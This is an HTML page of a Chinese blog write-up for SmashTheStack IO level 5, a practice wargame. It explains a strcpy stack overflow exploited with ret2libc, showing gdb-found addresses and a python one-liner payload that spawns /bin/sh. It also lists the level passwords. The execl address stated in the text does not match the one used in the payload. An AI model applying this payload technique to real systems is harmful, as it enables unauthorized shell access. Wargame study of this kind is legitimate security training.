@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>SmashTheStack IO level5 | Star</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="缓冲区溢出,Smash the Stack," />
+  
+
+  <meta name="description" content="密码：LOoCy5PbKi63qXTh">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SmashTheStack IO level5">
+<meta property="og:url" content="http://huirong.github.io/2015/05/30/smashTheStack-io-level5/index.html">
+<meta property="og:site_name" content="Star">
+<meta property="og:description" content="密码：LOoCy5PbKi63qXTh">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCjw1esmcb5wlznj30k201lq34.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCjw1esmcbnj1jlj30oe0esac4.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCjw1esmcczmmznj30k5021aag.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCjw1esmcc9q14yj30k30bmgom.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCjw1esmcci3a7vj30k309mafx.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCjw1esmccofiyfj30k307mwh3.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1esmcdday4nj30k30c375r.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1esmcdvn3mzj30k302jmyt.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1esmce74oxcj30k203iabv.jpg">
+<meta property="og:updated_time" content="2016-04-16T11:29:55.758Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SmashTheStack IO level5">
+<meta name="twitter:description" content="密码：LOoCy5PbKi63qXTh">
+<meta name="twitter:image" content="http://ww4.sinaimg.cn/large/005CA6ZCjw1esmcb5wlznj30k201lq34.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=028c63b1" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/huirong.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016sfsf1fba3xxxx8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#I、源代码"><span class="toc-text">I、源代码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-源代码"><span class="toc-text">① 源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-执行结果"><span class="toc-text">② 执行结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#II、相关知识"><span class="toc-text">II、相关知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#III、找漏洞"><span class="toc-text">III、找漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-思路"><span class="toc-text">① 思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-引入环境变量"><span class="toc-text">② 引入环境变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#③-gdb调试"><span class="toc-text">③ gdb调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#④-查看execl-、exit-、”-bin-sh”地址"><span class="toc-text">④ 查看execl()、exit()、”/bin/sh”地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#⑤-校正”-bin-sh”地址"><span class="toc-text">⑤ 校正”/bin/sh”地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#⑥-获得密码"><span class="toc-text">⑥ 获得密码</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-smashTheStack-io-level5" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">SmashTheStack IO level5</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2015.05.30</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>star</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/Smash-the-Stack/">Smash the Stack</a>
+  </span>
+
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://huirong.github.io/2015/05/30/smashTheStack-io-level5/#disqus_thread"></a>
+        </span>
+      
+
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>密码：LOoCy5PbKi63qXTh<br><a id="more"></a></p>
+<h1 id="I、源代码"><a href="#I、源代码" class="headerlink" title="I、源代码"></a>I、源代码</h1><h2 id="①-源代码"><a href="#①-源代码" class="headerlink" title="① 源代码"></a>① 源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="built_in">strcpy</span>(buf, argv[<span class="number">1</span>]);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="②-执行结果"><a href="#②-执行结果" class="headerlink" title="② 执行结果"></a>② 执行结果</h2><p><img src="http://ww4.sinaimg.cn/large/005CA6ZCjw1esmcb5wlznj30k201lq34.jpg" alt=""></p>
+<h1 id="II、相关知识"><a href="#II、相关知识" class="headerlink" title="II、相关知识"></a>II、相关知识</h1><ul>
+<li>最基本的缓冲区溢出 level3就是基本缓冲区溢出例子，相信大家都了解了</li>
+<li><a href="http://www.ibm.com/developerworks/cn/linux/1402_liumei_rilattack/" target="_blank" rel="external">ret2lib</a>        原理有点长，我就不赘述了，大家可以参考我给的链接，也可以自己找原理</li>
+</ul>
+<h1 id="III、找漏洞"><a href="#III、找漏洞" class="headerlink" title="III、找漏洞"></a>III、找漏洞</h1><h2 id="①-思路"><a href="#①-思路" class="headerlink" title="① 思路"></a>① 思路</h2><p>观察前几关的程序，需要构造输入的，最终的目的是执行execl(“/bin/sh”)<br>所以我首先想到的是，构造输入，修改main返回地址，让其指向库函数execl()起始地址，为了让execl正常返回，exit()地址入栈，然后参数”/bin/sh”入栈<br>栈结果如图：<br><img src="http://ww2.sinaimg.cn/large/005CA6ZCjw1esmcbnj1jlj30oe0esac4.jpg" alt=""></p>
+<h2 id="②-引入环境变量"><a href="#②-引入环境变量" class="headerlink" title="② 引入环境变量"></a>② 引入环境变量</h2><p>不存在值为”/bin/sh”的环境变量，首先引入环境变量BIN_SH（名字自拟），在同一个shell下，地址不变<br><img src="http://ww4.sinaimg.cn/large/005CA6ZCjw1esmcczmmznj30k5021aag.jpg" alt=""></p>
+<h2 id="③-gdb调试"><a href="#③-gdb调试" class="headerlink" title="③ gdb调试"></a>③ gdb调试</h2><p>查看buf，ret地址,计算两者的差距<br><img src="http://ww3.sinaimg.cn/large/005CA6ZCjw1esmcc9q14yj30k30bmgom.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/large/005CA6ZCjw1esmcci3a7vj30k309mafx.jpg" alt=""></p>
+<p>buf：0xbffffbb0，ret：0xbffffc3c，两者相差 0x8c<br>因此<font color="red">输入格式：</font> “A”*0x8c + execl()起始地址 + exit()起始地址 + “/bin/sh”起始地址</p>
+<h2 id="④-查看execl-、exit-、”-bin-sh”地址"><a href="#④-查看execl-、exit-、”-bin-sh”地址" class="headerlink" title="④ 查看execl()、exit()、”/bin/sh”地址"></a>④ 查看execl()、exit()、”/bin/sh”地址</h2><p>在调试过程中可以p system     p exit 就可以查看了<br>环境变量BIN_SH在栈的下面，x/1000s 0xbffffbb0  可以打印出从0xbffffbb0开始的1000个字符（具体单位我也不清楚，大家自己百度），一直向下查看就可以找到BIN_SH了<br><img src="http://ww1.sinaimg.cn/large/005CA6ZCjw1esmccofiyfj30k307mwh3.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1esmcdday4nj30k30c375r.jpg" alt=""></p>
+<p>execl  : 0xb7f0f3f0<br>exit   : 0xb7e9d270<br>BIN_SH=/bin/sh : 0xbfffff6f<br>/bin/sh : 0xbfffff76</p>
+<h2 id="⑤-校正”-bin-sh”地址"><a href="#⑤-校正”-bin-sh”地址" class="headerlink" title="⑤ 校正”/bin/sh”地址"></a>⑤ 校正”/bin/sh”地址</h2><p>现在来验证下BIN_SH的地址是否正确<br><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1esmcdvn3mzj30k302jmyt.jpg" alt=""><br>这个是调用execl()函数时，参数出错提示，说明execl地址正确<br>根据我的血泪史，一般函数地址这样查找都没有错，环境变量的地址一般不正确<br>经过我多次测试，/bin/sh : 0xbfffff70</p>
+<p><font color="red">PS：</font>我的校正方法<br>在/tmp 目录下新建一个自己的文件夹 star<br>进入 star 文件夹  ：cd star<br>想办法生成core文件，调试时，加上core文件，gdb ./level05 core -q  ，然后查看 BIN_SH 的地址</p>
+<h2 id="⑥-获得密码"><a href="#⑥-获得密码" class="headerlink" title="⑥ 获得密码"></a>⑥ 获得密码</h2><p>输入格式 “A”*0x8c + “0xb7f0f3f0” + “0xb7e9d270” + “0xbfffff70”</p>
+<p>“$(python -c ‘print “A”*0x8c + “\x30\x9c\xea\xb7” + “\x70\xd2\xe9\xb7” + “\x70\xff\xff\xbf” ‘)”<br><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1esmce74oxcj30k203iabv.jpg" alt=""></p>
+<p>OK！！！ 密码get：rXCikld0ex3EQsnI</p>
+
+    
+  </div>
+</article>
+
+</div>
+
+
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">走过的，路过的，请支持一下我 n(*≧▽≦*)n</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'huirong';
+    
+    var disqus_url = 'http://huirong.github.io/2015/05/30/smashTheStack-io-level5/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//huirong.disqus.com/count.js" async></script>
+
+
+
+    
+  <section class="duoshuo-comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="http://huirong.github.io/2015/05/30/smashTheStack-io-level5/index.html" data-title="SmashTheStack IO level5" data-url="http://huirong.github.io/2015/05/30/smashTheStack-io-level5/index.html"></div>
+    <!-- 多说评论框 end -->
+  </section>
+
+
+
+
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:"star"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
